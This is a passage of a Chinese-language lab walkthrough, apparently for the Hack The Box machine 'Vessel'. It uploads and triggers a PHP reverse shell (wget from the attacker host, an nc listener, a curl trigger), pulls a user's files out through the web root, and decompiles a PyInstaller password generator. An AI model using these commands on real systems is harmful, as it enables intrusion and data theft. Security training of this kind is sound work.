<pre class="line-numbers language-none"><code class="language-none">wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改ip和port为本地ip和端口</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326151308134.png"></p>
<p>本地开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在靶机www-data用户的shell环境，从本地下载php-reverse-shell.php到<code>/var/www/html/owa/owa-data/logs</code>目录下</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.16.7/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326160742241.png"></p>
<p>再次本地开启nc监听9898端口，然后本地运行如下命令触发反弹shell文件</p>
<pre class="line-numbers language-none"><code class="language-none">curl http://openwebanalytics.vessel.htb/owa-data/logs/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230326160525009.png"></p>
<p>home目录下有两个用户，ethan和steven，进入<code>/home/ethan</code>目录没权限，于是进<code>/home/steven</code>目录</p>
<p>在<code>/home/steven</code>目录下有一个<code>passwordGenerator</code>文件，在<code>/home/steven/.notes</code>有两个可疑文件：<code>notes.pdf</code>和<code>screenshot.png</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327082447889.png"></p>
<p>把文件都复制到<code>/var/www/html/owa/owa-data/logs/</code>目录下，便于访问下载</p>
<pre class="line-numbers language-none"><code class="language-none">cp notes.pdf /var/www/html/owa/owa-data/logs/
cp screenshot.png /var/www/html/owa/owa-data/logs/
cp passwordGenerator /var/www/html/owa/owa-data/logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>回到本地，将三个文件下载下来</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://openwebanalytics.vessel.htb/owa-data/logs/notes.pdf
wget http://openwebanalytics.vessel.htb/owa-data/logs/screenshot.png
wget http://openwebanalytics.vessel.htb/owa-data/logs/passwordGenerator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>notes.pdf</code>打开需要密码，<code>screenshot.png</code>如下，密码长度32位，这应该是<code>passwordGenerator</code>的运行界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327083202789.png" style="zoom: 80%;">

<p>执行如下命令，看到<code>passwordGenerator</code>是Windows下的可执行文件，PE32表示Portable Executable 32-bit</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# file passwordGenerator
passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>把<code>passwordGenerator</code>拖到Windows机器中，后缀加上<code>.exe</code>，双击运行，如下左侧可选择password长度，右侧有三个选项<code>ALL Characters</code>、<code>Alphabetic</code>(字母)、<code>Alphanumeric</code>(字母数字)，前面拿到的截图是第一个选项</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327165413416.png" style="zoom: 67%;">

<p>点击<code>Generate!</code>，弹窗提示生成passwords前要更改默认values，看来是生成不了，得曲线救国，破解它</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327165902638.png" style="zoom:67%;">

<h2 id="六、Python反编译"><a href="#六、Python反编译" class="headerlink" title="六、Python反编译"></a>六、Python反编译</h2><p>在Windows用WinHex（其他16进制文本编辑器均可）打开这个可执行程序，在末尾可以发现<code>pyinstaller</code>编译的标志<code>MEI</code></p>
<p>python反编译参考：<a href="https://blog.51cto.com/u_15060540/3888913">https://blog.51cto.com/u_15060540/3888913</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327094458918.png" style="zoom:67%;">

<p>下载<code>pyinstxtractor</code>脚本</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/extremecoders-re/pyinstxtractor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>把<code>passwordGenerator</code>放到下好的脚本同目录下，运行如下命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop/pyinstxtractor]
└─# python3 pyinstxtractor.py passwordGenerator 
[+] Processing passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>会在当前文件夹自动生成名叫<code>passwordGenerator_extracted</code>的目录</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327100100822.png" style="zoom:80%;">

<p>用<code>uncompyle6</code>反编译目标<code>.pyc</code>文件</p>
<pre class="line-numbers language-none"><code class="language-none">pip install uncompyle6
uncompyle6 passwordGenerator.pyc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>得到源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.9.0</span>
<span class="token comment"># Python bytecode version base 3.7.0 (3394)</span>
<span class="token comment"># Decompiled from: Python 3.9.1+ (default, Feb  5 2021, 13:46:56) </span>
<span class="token comment"># [GCC 10.2.1 20210110]</span>
<span class="token comment"># Embedded file name: passwordGenerator.py</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2 <span class="token keyword">import</span> QtWidgets
<span class="token keyword">import</span> pyperclip

<span class="token keyword">class</span> <span class="token class-name">Ui_MainWindow</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">setupUi</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> MainWindow<span class="token punctuation">.</span>objectName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            MainWindow<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token number">560</span><span class="token punctuation">,</span> <span class="token number">408</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>centralwidget <span class="token operator">=</span> QWidget<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'centralwidget'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">411</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_2'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'generate'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token number">261</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength <span class="token operator">=</span> QSpinBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'PasswordLength'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setMinimum<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setMaximum<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'copyButton'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">460</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_4'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox <span class="token operator">=</span> QCheckBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'checkBox'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setCheckable<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setChecked<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setTristate<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox <span class="token operator">=</span> QComboBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'comboBox'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_5'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field <span class="token operator">=</span> QLineEdit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'password_field'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">351</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>setCentralWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>statusbar <span class="token operator">=</span> QStatusBar<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>statusbar<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'statusbar'</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>setStatusBar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>statusbar<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>retranslateUi<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        QMetaObject<span class="token punctuation">.</span>connectSlotsByName<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">retranslateUi</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        MainWindow<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:20pt;"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Generate!'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Copy'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'All Characters'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Alphabetic'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Alphanumeric'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:16pt;"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">MainWindow</span><span class="token punctuation">(</span>QMainWindow<span class="token punctuation">,</span> Ui_MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>MainWindow<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setupUi<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setFixedSize<span class="token punctuation">(</span>QSize<span class="token punctuation">(</span><span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Secure Password Generator'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setReadOnly<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>passlen<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>chars<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>hide<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>gen<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">passlen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>valueChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>lenpass<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">lenpass</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> value
        value <span class="token operator">=</span> l

    <span class="token keyword">def</span> <span class="token function">chars</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>currentIndexChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>charss<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">charss</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> index
        index <span class="token operator">=</span> i

    <span class="token keyword">def</span> <span class="token function">hide</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>stateChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>status<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> status
        status <span class="token operator">=</span> s <span class="token operator">==</span> Qt<span class="token punctuation">.</span>Checked

    <span class="token keyword">def</span> <span class="token function">copy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>copied<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">copied</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        pyperclip<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>genButton<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">genButton</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            hide <span class="token operator">=</span> status
            <span class="token keyword">if</span> hide<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setEchoMode<span class="token punctuation">(</span>QLineEdit<span class="token punctuation">.</span>Password<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
